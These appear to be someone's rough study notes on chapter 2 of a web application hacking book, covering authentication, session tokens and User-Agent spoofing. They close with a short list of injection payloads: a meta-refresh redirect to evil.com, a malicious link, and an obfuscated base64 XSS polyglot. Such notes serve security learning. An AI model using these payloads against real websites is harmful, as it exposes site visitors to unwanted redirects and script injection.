## started reading This book called the web application hackerbook on 21-04-24

# chap 2

## Title 
``` Python
Core Defence Mechanism

It include  
*Authentication
*Session Management 
*Access control

```

# Authentication

``` pyhton

The basic flaw is that an attacker can easily impersonate it self as victim like trying their passwd or any leaked cred  found on internate

-How to safegaurd

*Different authentication method like multifactor authenticaiton
```

eg: 

![](Attachements/Pasted%20image%2020240421124320.png)


# Session Managememt

>- In session management user can can have session token which can be easily bypass
>- as user in user it's onn session cookie and can byspass it

```
when u tried to login to page you enter username/passwd now server sends u a session token which is a short lived passwd and whenevr u tried to verify yourselve this token is required


like u rember when you don't login to a site for days it says you to login again even though u re login in before this have bacuse oyur session cookie is expired
```

To learn mor about it follow this : https://www.youtube.com/watch?v=_jz5qFWhLcg&ab_channel=RanaKhalil



##  make sure to check  http header for some vulnerability


``` bash

An important trend in recent years has been for applications to present dif-
ferent content to users who access the application via different devices (laptop,

cell phone, tablet). This is achieved by inspecting the User-Agent header. As well
as providing an avenue for input-based attacks directly within the User-Agent
header itself, this behavior provides an opportunity to uncover an additional
attack surface within the application. By spoofi ng the User-Agent header for
a popular mobile device, you may be able to access a simplifi ed user interface

that behaves differently than the primary interface. Since this interface is gener-
ated via different code paths within the server-side application, and may have

been subjected to less security testing, you may identify bugs such as cross-site
scripting that do not exist in the primary application interface.

```
>-Tip

>Burp Intruder contains a built-in payload list containing a large number
of user agent strings for different types of devices. You can carry out a simple
attack that performs a GET request to the main application page supplying
different user agent strings and then review the intruder results to identify
anomalies that suggest a different user interface is being presented.






rewwward number :  #### 648966471]



## HTMl css injection payload

```python

<meta http-equiv="refresh" content="2; https://evil.com/" />

#stored xss through html injection
<a href="https://malicious-site.com">Click me!</a>


#clinet side javascript injection

</base</sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->＜h1/<h1><image/onerror="import('data:application/javascript;charset=utf-8;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKTtjb25zb2xlLmxvZyhkb2N1bWVudC5kb21haW4pOy8v')//%27"src><script>
```